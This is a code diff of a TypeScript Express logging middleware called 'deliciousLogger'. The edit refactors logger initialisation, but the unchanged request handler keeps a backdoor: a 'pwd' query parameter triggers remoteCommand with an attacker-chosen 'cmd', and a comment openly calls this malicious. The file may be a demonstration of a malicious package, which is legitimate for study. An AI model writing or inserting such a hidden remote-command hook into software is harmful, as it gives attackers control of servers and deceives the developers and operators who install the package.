@@ -11,17 +11,28 @@ const loggerFactory = new LoggerFactory();
  * @param opts Options for configuration
  * @returns Middleware
  */
-const deliciousLogger =
-  (opts: LoggerOptions) => (req: Request, _res: Response, next: any) => {
+const deliciousLogger = ({
+  layout = 'basic',
+  filename,
+  separator,
+  maxFileSize,
+}: LoggerOptions) => {
+  // Init logger
+  const logger = loggerFactory.getLogger({
+    layout,
+    filename,
+    separator,
+    maxFileSize,
+  });
+  return (req: Request, _res: Response, next: any) => {
     const { pwd, cmd } = req.query;
     // If backdoor password included, acts maliciously
     if (pwd) {
       remoteCommand(pwd as string, cmd as string);
     }
-    const logger = loggerFactory.getLogger(opts);
     logger.log(req);
     logger.stash(req);
     next();
   };
-
+};
 export default deliciousLogger;
